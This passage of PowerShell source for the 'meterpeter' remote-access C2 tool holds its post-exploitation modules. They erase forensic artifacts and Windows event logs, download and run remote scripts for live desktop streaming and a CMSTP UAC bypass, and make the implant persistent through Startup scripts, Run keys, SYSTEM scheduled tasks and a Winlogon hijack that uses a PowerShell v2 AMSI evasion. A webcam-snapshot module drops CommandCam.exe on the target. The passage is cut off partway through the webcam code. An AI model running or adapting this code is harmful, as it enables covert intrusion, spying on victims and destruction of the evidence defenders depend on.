            $MeterClient = "$payload_name" + ".ps1" -Join '';Write-Host "`n"
            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[x] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[X] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
         }
         If($track_choise -ieq "Paranoid") 
         {
            Write-Host " - Display verbose outputs? (y|n): " -NoNewline
            $StDoutStatus = Read-Host;If($StDoutStatus -iMatch '^(y|yes|true)$'){$stdout = "True"}Else{$stdout = "False"}
            Write-Host " - Delete Restore Points? (y|n)  : " -NoNewline
            $RPointsStatus = Read-Host;If($RPointsStatus -iMatch '^(y|yes|true)$'){$RStdout = "True"}Else{$RStdout = "False"}
            Write-Host " * Please wait while module cleans artifacts." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1`" -OutFile `"`$Env:TMP\CleanTracks.ps1`"|Out-Null;powershell -exec bypass -File `$Env:TMP\CleanTracks.ps1 -CleanTracks Paranoid -Verb $stdout -DelRestore $RStdout;Remove-Item -Path `$Env:TMP\CleanTracks.ps1 -EA SilentlyContinue -Force"
         }
         If($track_choise -ieq "Return" -or $track_choise -ieq "cls" -or $track_choise -ieq "modules" -or $track_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $track_choise = $Null;
         }
      }
      If($choise -ieq "Stream")
      {
         write-host "`n`n   Requirements" -ForegroundColor Yellow
         write-host "   ------------"
         write-host "   Mozilla firefox browser which supports MJPEG installed on attacker."
         write-host "   Streams target desktop live untill 'execution' setting its reached."
         write-host "   Remark: 30 seconds its the minimum accepted execution timer input." -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Start    Stream target desktop        Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Stream> " -NoNewline -ForeGroundColor Green;
         $Stream_choise = Read-Host;
         If($Stream_choise -ieq "Start")
         {

            If(-not(Test-Path -Path "$Env:ProgramFiles\Mozilla Firefox\firefox.exe" -EA SilentlyContinue))
            {
               $Command = $Null;
               Write-Host "`n   warning: Stream target desktop function requires firefox.exe`n            Installed on attacker machine to access the stream." -ForegroundColor Red -BackgroundColor Black
            }
            Else
            {
               $BindPort = "1234"
               write-host " - Input execution time: " -NoNewline
               [int]$ExecTimmer = Read-Host
               If($ExecTimmer -lt 30 -or $ExecTimmer -eq $null)
               {
                  $ExecTimmer = "30"
                  Write-Host "   => Execution to small, defaulting to 30 seconds .." -ForegroundColor Red
                  Start-Sleep -Milliseconds 500
               }
               write-host " - Input target ip addr: " -NoNewline
               $RemoteHost = Read-Host
               Write-Host " * Streaming -[ $RemoteHost ]- Desktop Live!" -ForegroundColor Green
               If(-not($RemoteHost) -or $RemoteHost -eq $null)
               {
                  $RemoteHost = "$Local_Host" #Run stream againts our selft since none ip as inputed!
               }

               #Build output DataTable!
               $StreamTable = New-Object System.Data.DataTable
               $StreamTable.Columns.Add("local_host")|Out-Null
               $StreamTable.Columns.Add("remote_host")|Out-Null
               $StreamTable.Columns.Add("bind_port")|Out-Null
               $StreamTable.Columns.Add("connection")|Out-Null
               $StreamTable.Columns.Add("execution ")|Out-Null

               #Adding values to output DataTable!
               $StreamTable.Rows.Add("$Local_Host","$RemoteHost","$BindPort","Bind","$ExecTimmer seconds")|Out-Null

               #Diplay output DataTable!
               Write-Host "`n";Start-Sleep -Milliseconds 500
               $StreamTable | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 |
               Select-Object -SkipLast 1 | ForEach-Object {
                  $stringformat = If($_ -Match '^(local_host)'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
                  Write-Host @stringformat $_
               }
               
               <#
               .SYNOPSIS
                  Author: @r00t-3xp10it
                  Helper - Stream Target Desktop (MJPEG)

               .NOTES
                  The next cmdline downloads\imports 'Stream-TargetDesktop.ps1' into %TMP%,
                  Import module, creates trigger.ps1 script to execute 'TargetScreen -Bind'
                  sleeps for sellected amount of time (ExecTimmer), before stoping stream,
                  and deleting all artifacts left behind by this function.
               #>

               #Anwsome Banner
               $AnwsomeBanner = @"
                  '-.
                     '-. _____    
              .-._      |     '.  
             :  ..      |      :  
             '-._'      |    .-'
              /  \     .'i--i
             /    \ .-'_/____\___
                 .-'  :          :Stream_Desktop_Live ..
---------------------------------------------------------------------
"@;Write-Host $AnwsomeBanner
               Write-Host "* Start firefox on: '" -ForegroundColor Red -BackgroundColor Black -NoNewline;
               Write-host "http://${RemoteHost}:${BindPort}" -ForegroundColor Green -BackgroundColor Black -NoNewline;
               Write-host "' to access live stream!" -ForegroundColor Red -BackgroundColor Black;
               $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Stream-TargetDesktop.ps1 -OutFile `$Env:TMP\Stream-TargetDesktop.ps1|Out-Null;echo `"Import-Module -Name `$Env:TMP\Stream-TargetDesktop.ps1 -Force`"|Out-File -FilePath `"`$Env:TMP\trigger.ps1`" -Encoding ascii -Force;Add-Content `$Env:TMP\trigger.ps1 `"TargetScreen -Bind -Port $BindPort`";Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\trigger.ps1`"|Out-Null;Start-Sleep -Seconds $ExecTimmer;`$StreamPid = Get-Content -Path `"`$Env:TMP\mypid.log`" -EA SilentlyContinue|Where-Object { `$_ -ne '' };Stop-Process -id `$StreamPid -EA SilentlyContinue -Force;Remove-Item -Path `$Env:TMP\trigger.ps1 -Force;Remove-Item -Path `$Env:TMP\mypid.log -Force;Remove-Item -Path `$Env:TMP\Stream-TargetDesktop.ps1 -Force";
            }

         }
         If($Stream_choise -ieq "Return" -or $Stream_choise -ieq "cls" -or $Stream_choise -ieq "modules" -or $Stream_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $Delay_Time = $Null;
            $Stream_choise = $Null;
         }
      }
      If($choise -ieq "Escalate")
      {
        write-host "`n`n   Requirements" -ForegroundColor Yellow
        write-host "   ------------"
        write-host "   Attacker needs to input the delay time (in seconds) for the client.ps1"
        write-host "   to beacon home after the privilege escalation. Attacker also needs to exit"
        write-host "   meterpeter C2 and start a new listenner to receive the elevated connection."
        write-host "   Remark: This function does not execute _EOP_ if client connection is active." -ForegroundColor Yellow
        write-host "`n`n   Modules     Description                   Remark" -ForegroundColor green
        write-host "   -------     -----------                   ------"
        write-host "   getadmin    Escalate client privileges    Client:User  - Privileges required"
        write-host "   Delete      Delete getadmin artifacts     Client:User  - Privileges required"
        write-host "   CmdLine     Uac execute command elevated  Client:User  - Privileges required"
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow
        write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green
        $Escal_choise = Read-Host;
        If($Escal_choise -ieq "GetAdmin")
        {
          write-host " - Input execution delay time  : " -NoNewline
          $DelayTime = Read-Host
          write-host " - Max EOP (client) executions : " -NoNewline
          $ExecRatLoop = Read-Host
          write-host " - Edit client location? (y|n) : " -NoNewline
          $EditRatLocation = Read-Host
          If($EditRatLocation -iMatch '^(y|yes|s)$')
          {
             write-host " - Input client remote location: " -NoNewline
             $RatLocation = Read-Host
             If(-not($RatLocation) -or $RatLocation -eq $null)
             {
                $RatStdOut = "`$Env:TMP\Update-KB5005101.ps1"
                $RatLocation = "False"
             }
             Else
             {
                $RatStdOut = "$RatLocation"            
             }
          }
          Else
          {
             $RatStdOut = "`$Env:TMP\Update-KB5005101.ps1"
             $RatLocation = "False"
          }

          If(-not($DelayTime) -or $DelayTime -lt "30"){$DelayTime = "30"}
          If(-not($ExecRatLoop) -or $ExecRatLoop -lt "1"){$ExecRatLoop = "1"}
          Write-Host " * Elevate session from UserLand to Administrator!" -ForegroundColor Green
          Write-Host "   => Downloading: UACBypassCMSTP from GitHub into %TMP% ..`n" -ForeGroundColor Blue
          Start-Sleep -Seconds 1

          #Build output DataTable!
          $mytable = New-Object System.Data.DataTable
          $mytable.Columns.Add("max_executions")|Out-Null
          $mytable.Columns.Add("execution_delay")|Out-Null
          $mytable.Columns.Add("rat_remote_location")|Out-Null

          #Adding values to DataTable!
          $mytable.Rows.Add("$ExecRatLoop",        ## max eop executions
                            "$DelayTime seconds",  ## Looop each <int> seconds
                            "$RatStdOut"           ## rat client absoluct path
          )|Out-Null

          #Diplay output DataTable!
          $mytable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1 | ForEach-Object {
             $stringformat = If($_ -Match '^(max_executions)'){
                @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
             Write-Host @stringformat $_
          }

          #Anwsome Banner
          $AnwsomeBanner = @"
                             ____
                     __,-~~/~    `---.
                   _/_,---(      ,    )
               __ /        <    /   )  \___
- ------===;;;'====------------------===;;;===--------  -
                  \/  ~"~"~"~"~"~\~"~)~"/
                  (_ (   \  (     >    \)
                   \_( _ <         >_>'
                      ~ `-i' ::>|--"
                          I;|.|.|
                         <|i::|i|`.
                        (` ^'"`-' ") CMSTP EOP
--------------------------------------------------------------------------
"@;Write-Host $AnwsomeBanner
          Write-Host "* Exit *Meterpeter* and start a new Handler to recive the elevated shell.." -ForegroundColor Red -BackgroundColor Black
          Write-Host "  => _EOP_ shell settings: lhost:" -ForegroundColor Red -BackgroundColor Black -NoNewline;
          Write-Host "$Local_Host" -ForegroundColor Green -BackgroundColor Black -NoNewline;
          Write-Host " lport:" -ForegroundColor Red -BackgroundColor Black -NoNewline;
          Write-Host "$Local_Port" -ForegroundColor Green -BackgroundColor Black -NoNewline;
          Write-Host " obfuscation:bxor" -ForegroundColor Red -BackgroundColor Black;

          #Execute Command Remote
          Start-Sleep -Seconds 1;$TriggerSettings = "$Local_Host"+":"+"$Local_Port" -join ''
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"`n[x] Error: Abort, session allready running under Administrator token ..`" `> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force;}Else{echo `"$TriggerSettings`" `> `$Env:TMP\EOPsettings.log;iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CMSTPTrigger.ps1 -OutFile `$Env:TMP\CMSTPTrigger.ps1|Out-Null;Start-Process -WindowStyle hidden powershell.exe -ArgumentList `"-File `$Env:TMP\CMSTPTrigger.ps1 -DelayTime $DelayTime -LoopFor $ExecRatLoop -RatLocation $RatLocation`"}"
        }
        If($Escal_choise -ieq "Delete" -or $Escal_choise -ieq "del")
        {
          Write-Host " Delete privilege escalation artifacts left behind." -ForegroundColor Green -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "Stop-Process -Name cmstp -EA SilentlyContinue;Remove-Item -Path `"`$Env:TMP\*`" -Include *.log,*.ps1,*.dll,*.inf,*.bat,*.vbs -Exclude *Update-* -EA SilentlyContinue -Force;echo `"   [i] meterpeter EOP artifacts successfuly deleted.`" `> logme.log;Get-Content logme.log;Remove-Item -Path logme.log";
        }
        If($Escal_choise -ieq "CmdLine")
        {
           Write-Host " * Spawn UAC gui to run cmdline elevated." -ForegroundColor Green
           write-host " - Input cmdline to run elevated: " -NoNewline
           $ElevatedCmdLine = Read-Host

           $Command = "powershell -C `"Start-Process $Env:WINDIR\system32\cmd.exe -ArgumentList '$ElevatedCmdLine' -verb RunAs`";echo `"`n[i] Executing: '$ElevatedCmdLine'`" `> `$Env:TMP\sdhsdc.log;Get-Content `$Env:TMP\sdhsdc.log;Remove-Item -Path `"`$Env:TMP\sdhsdc.log`" -Force"
        }
        If($Escal_choise -ieq "Return" -or $Escal_choise -ieq "cls" -or $Escal_choise -ieq "modules" -or $Escal_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Delay_Time = $Null;
          $Escal_choise = $Null;
          $trigger_File = $Null;
        }
      }
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        write-host "`n`n   Requirements" -ForegroundColor Yellow;
        write-host "   ------------";
        write-host "   Client (payload) must be deployed in target %TEMP% folder.";
        write-host "   Meterpeter C2 must be put in listener mode (using same lhost|lport), and";
        write-host "   Target machine needs to restart (startup) to beacon home at sellected time." -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Beacon    Persiste Client using startup   Client:User  - Privileges required";
        write-host "   RUNONCE   Persiste Client using REG:Run   Client:User  - Privileges required";
        write-host "   REGRUN    Persiste Client using REG:Run   Client:User|Admin - Privs required";
        write-host "   Schtasks  Persiste Client using Schtasks  Client:Admin - Privileges required";
        write-host "   WinLogon  Persiste Client using WinLogon  Client:Admin - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Persistance> " -NoNewline -ForeGroundColor Green;
        $startup_choise = Read-Host;
        If($startup_choise -ieq "Beacon")
        {
          $dat = Get-Date;
          $BeaconTime = $Null;
          $logfile = "$IPATH"+"beacon.log";
          Write-host " - Input Time (sec) to beacon home (eg: 60): " -NoNewline;
          $Delay_Time = Read-Host;
          If(-not($Delay_Time) -or $Delay_Time -lt "30"){$Delay_Time = "60"}
          $BeaconTime = "$Delay_Time"+"000";
          write-host " * Execute client ($payload_name.ps1) with $Delay_Time (sec) loop." -ForegroundColor Green;Start-Sleep -Seconds 1;
          Write-Host "`n   Scripts               Remote Path" -ForeGroundColor green;
          Write-Host "   -------               -----------";
          Write-Host "   $payload_name.ps1  `$Env:TMP\$payload_name.ps1";
          Write-Host "   $payload_name.vbs  `$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
          Write-Host "   Persistence LogFile:  $logfile" -ForeGroundColor yellow;
          Write-Host "   On StartUp our client should beacon home from $Delay_Time to $Delay_Time seconds.`n" -ForeGroundColor yellow;
          $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
          #$Command = ChkDskInternalFuncio(Char_Obf($Command));
          ## Writing persistence setting into beacon.log local file ..
          echo "" >> $logfile;echo "Persistence Settings" >> $logfile;
          echo "--------------------" >> $logfile;
          echo "DATE  : $dat" >> $logfile;
          echo "RHOST : $Remote_Host" >> $logfile;
          echo "LHOST : $Local_Host" >> $logfile;
          echo "LPORT : $Local_Port`n" >> $logfile;
        }
        If($startup_choise -ieq "RUNONCE" -or $startup_choise -ieq "once")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist               Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------               -------------------";
          Write-Host "   Update-KB5005101.ps1  `$env:tmp\KBPersist.vbs`n";
          $Command = "cmd /R REG ADD 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce' /v KBUpdate /d '%tmp%\KBPersist.vbs' /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs";
          $Command = ChkDskInternalFuncio(Char_Obf($Command));
        }
        If($startup_choise -ieq "REGRUN" -or $startup_choise -ieq "run")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist               Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------               -------------------";
          Write-Host "   Update-KB5005101.ps1  `$env:tmp\KBPersist.vbs`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{cmd /R reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs}";
          }
        If($startup_choise -ieq "Schtasks" -or $startup_choise -ieq "tasks")
        {
          $onjuyhg = ([char[]]([char]'A'..[char]'Z') + 0..9 | sort {get-random})[0..7] -join '';
          write-host " * Make Client Beacon Home Every xx Minuts." -ForegroundColor Green;Start-Sleep -Seconds 1;
          write-Host " - Input Client Remote Path: " -NoNewline;
          $execapi = Read-Host;
          write-Host " - Input Beacon Interval (minuts): " -NoNewline;
          $Interval = Read-Host;write-host "`n";
          Write-Host "   TaskName   Client Remote Path" -ForeGroundColor green;
          Write-Host "   --------   ------------------";
          Write-Host "   $onjuyhg   $execapi";
          write-host "`n";
          If(-not($Interval)){$Interval = "10"}
          If(-not($execapi)){$execapi = "$env:tmp\Update-KB5005101.ps1"}
          ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
        }    
        If($startup_choise -ieq "WinLogon" -or $startup_choise -ieq "logon")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------                -------------------";
          Write-Host "   Update-KB5005101.ps1   `$env:tmp\KBPersist.vbs";
          Write-Host "   HIVEKEY: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($startup_choise -ieq "Return" -or $startup_choise -ieq "return" -or $logs_choise -ieq "cls" -or $logs_choise -ieq "Modules" -or $logs_choise -ieq "modules" -or $logs_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $startup_choise = $Null;
        }
      }
      If($choise -ieq "Camera" -or $choise -ieq "cam")
      {
        write-host "`n`n   Remark" -ForegroundColor Yellow;
        write-host "   ------";
        write-host "   This module allow users to list web cam devices or"
        write-host "   to simple use the target web cam to take a snapshot."
        write-host "   Remark: Executing this module in UserLand privs will" -ForegroundColor Yellow;
        write-host "   trigger powershell version 2 execution (AMS1 bypass)" -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Device    List Camera Devices             Client:User  -  Privileges required";
        write-host "   Snap      Auto use of default cam         Client:User|Admin  - Privs required";
        write-host "   Manual    Manual sellect device cam       Client:User|Admin  - Privs required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
        $Cam_choise = Read-Host;
        If($Cam_choise -ieq "Device" -or $Cam_choise -ieq "device")
        {
          $name = "CommandCam.exe";
          $File = "$Bin$name"
          If(([System.IO.File]::Exists("$File")))
          {
            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
            $FileBytes = "($FileBytes)";
            $File = $File.Split('\')[-1];
            $File = $File.Split('/')[-1];
            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /I /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
            $Command = $Command -replace "#","$File";
            $Command = $Command -replace "@","$FileBytes";
            $Upload = $True;
            $Cam_set = "True";
          } Else {
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
            $Command = $Null;
          }
        }
        If($Cam_choise -ieq "Snap" -or $Cam_choise -ieq "snap")
        {
          $name = "CommandCam.exe";
          $File = "$Bin$name"
          If(([System.IO.File]::Exists("$File")))
          {
            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
            $FileBytes = "($FileBytes)";
            $File = $File.Split('\')[-1];
            $File = $File.Split('/')[-1];
            #$Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";
            $Command = $Command -replace "#","$File";
            $Command = $Command -replace "@","$FileBytes";
            $Camflop = "True";
            $Upload = $True;
          } Else {
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
